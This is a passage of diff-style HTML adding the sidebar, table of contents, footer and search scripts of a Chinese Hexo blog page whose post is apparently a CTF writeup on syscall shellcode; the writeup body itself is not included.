+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">75</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.uaf.li" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://admintony.com" title="AdminTony" target="_blank">AdminTony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ares-x.com" title="AresX" target="_blank">AresX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexlt.org" title="hexman" target="_blank">hexman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://kabeor.github.io" title="kabeor" target="_blank">kabeor</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#赛题链接"><span class="nav-number">2.</span> <span class="nav-text">赛题链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">3.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux系统调用"><span class="nav-number">3.1.</span> <span class="nav-text">Linux系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#syscall的trick"><span class="nav-number">3.2.</span> <span class="nav-text">syscall的trick</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">4.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">5.</span> <span class="nav-text">利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sakura</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://sakura1328.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://eternalsakura13.com/2018/04/27/star_primepwn/';
+          this.page.identifier = '2018/04/27/star_primepwn/';
+          this.page.title = 'CTF中利用syscall写shellcode及*ctf primepwn writeup';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://sakura1328.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
